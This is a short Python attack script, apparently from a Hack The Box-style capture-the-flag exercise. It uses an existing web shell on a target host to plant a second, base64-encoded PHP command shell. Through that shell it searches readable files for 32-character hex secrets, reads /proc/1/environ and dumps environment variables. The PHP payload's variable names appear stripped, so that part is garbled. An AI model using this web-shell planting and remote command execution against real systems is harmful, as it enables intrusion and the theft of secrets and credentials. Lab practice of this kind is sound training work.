import urllib.request, urllib.parse
import base64

# Write a PHP script that searches for flags
php_code = b'''<?php
\ = \['cmd'] ?? '';
\ = shell_exec(\);
echo \;
?>
'''
encoded = base64.b64encode(php_code).decode()
# Write the script first
url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": "echo " + encoded + " | base64 -d > /tmp/cmd.php; echo done"})
headers = {"Host": "support_001.enigma.htb"}
req = urllib.request.Request(url, headers=headers)
resp = urllib.request.urlopen(req, timeout=10)
print(resp.read().decode())

# Now use this script to run commands with proper quoting
cmds = ['find /var /opt /tmp /etc -type f -readable 2>/dev/null | xargs grep -l -E "'+"'"+'[a-f0-9]{32}'+"'"+'" 2>/dev/null | head -20',
        'cat /proc/1/environ 2>/dev/null | tr "\\\\0" "\\\\n" | grep -i flag',
        'env | grep -i flag']
for cmd in cmds:
    url2 = "http://10.129.26.34/files/cmd.php?" + urllib.parse.urlencode({"cmd": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req2 = urllib.request.Request(url2, headers=headers)
    try:
        resp2 = urllib.request.urlopen(req2, timeout=30)
        result = resp2.read().decode("utf-8", errors="replace").strip()
        if result:
            print(f"=== {cmd[:50]} ===")
            print(result[:500])
            print()
    except Exception as e:
        print(f"Error: {e}")
